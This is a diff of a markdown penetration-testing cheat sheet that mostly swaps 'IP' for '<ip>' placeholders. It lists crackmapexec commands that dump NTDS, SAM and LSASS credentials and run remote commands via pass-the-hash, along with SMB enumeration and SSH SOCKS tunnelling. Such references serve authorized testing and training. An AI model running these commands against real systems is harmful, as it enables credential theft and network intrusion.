@@ -4,6 +4,8 @@
 
 `arp -a`
 
+`ip a`
+
 `ifconfig / ipconfig`
 
 `tcpdump -i eth0`
@@ -24,11 +26,11 @@
 
 ## Recon
 
-`enum4linux -a ip`
+`enum4linux -a <ip>`
 
-`smbmap -H ip`
+`smbmap -H <ip>`
 
-`crackmapexec smb IP`
+`crackmapexec smb <ip>`
 
 Get IP and hostname
 
@@ -46,7 +48,7 @@ Get IP and hostname
 # SSH Tunneling
 
 ### Socks proxy
-`ssh -D 8080 root@IP`
+`ssh -D 8080 root@<ip>`
 
 Set Firefox network settings to use socks5 proxy 127.0.0.1 8080, must remove the HTTP proxy
 
@@ -58,15 +60,15 @@ Set Firefox network settings to use socks5 proxy 127.0.0.1 8080, must remove the
 
 Gets all password history too, useful for identifying patterns
 
-`crackmapexec smb IP -u user -p password --ntds`
+`crackmapexec smb <ip> -u user -p password --ntds`
 
 ## Other
 
-`crackmapexec smb IP -u user -p password --sam`
+`crackmapexec smb <ip> -u user -p password --sam`
 
 Local SAM passwords, NTLM
 
-`crackmapexec smb IP -u user -p password --lsa`
+`crackmapexec smb <ip> -u user -p password --lsa`
 
 Looks for LSASS secrets, includes tokens and plaintext passwords stored in memory.
 
@@ -74,13 +76,13 @@ Looks for LSASS secrets, includes tokens and plaintext passwords stored in memor
 
 # crackmapexec
 
-`crackmapexec smb IP -u user -p password -x 'whoami'`
+`crackmapexec smb <ip> -u user -p password -x 'whoami'`
 
 -X for PowerShell, gets blocked by most systems
 
-`crackmapexec smb IP -u user -H hash -x 'whoami'`
+`crackmapexec smb <ip> -u user -H hash -x 'whoami'`
 
-Pass the hash.
+Pass the hash. This attack only works with NTLM hashes, not net hashes.
 
 **Protocols**: {smb,rdp,winrm,ssh,ldap,mssql,ftp}
 
